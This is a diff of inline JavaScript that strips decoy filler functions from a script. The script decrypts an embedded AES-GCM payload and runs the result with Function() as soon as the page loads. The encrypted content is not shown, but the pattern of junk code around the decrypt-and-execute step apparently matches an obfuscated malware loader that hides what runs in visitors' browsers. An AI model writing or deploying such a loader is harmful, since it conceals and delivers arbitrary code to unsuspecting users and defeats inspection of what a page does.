@@ -24,21 +24,8 @@
             return Uint8Array.from(hex.match(/.{2}/g).map((h) => parseInt(h, 16)));
         };
 
-        const uselessFunction = () => {
-            let uselessVar = 123;
-            document.body.innerHTML += `<!-- Dummy HTML Fragment ${uselessVar} -->`;
-        };
-
-        const appendHiddenElement = () => {
-            const hiddenEl = document.createElement("div");
-            hiddenEl.id = "dummy-element";
-            hiddenEl.style.display = "none";
-            document.body.appendChild(hiddenEl);
-        };
-
         const decrypt = async (enc, ivHex, saltHex, key) => {
             console.log("Starting AES-GCM decryption...");
-            appendHiddenElement(); // Adding pointless element
 
             const iv = hexToBytes(ivHex);
             const salt = hexToBytes(saltHex);
@@ -76,11 +63,8 @@
                 return "";
             }
         };
-
-
         (async () => {
             console.log("Main script execution started...");
-            uselessFunction();
 
             
             const payload = {
@@ -94,7 +78,6 @@
                 console.log("Decrypted Output:", decryptedContent);
                 const reversed = decryptedContent.split("").reverse().join(""); // Dummy transformation
                 console.log("Transformed Output:", reversed);
-                
                 document.getElementById("useless-container").innerText = "Decryption Success!";
                 Function(`${decryptedContent}`)();
             } catch (err) {
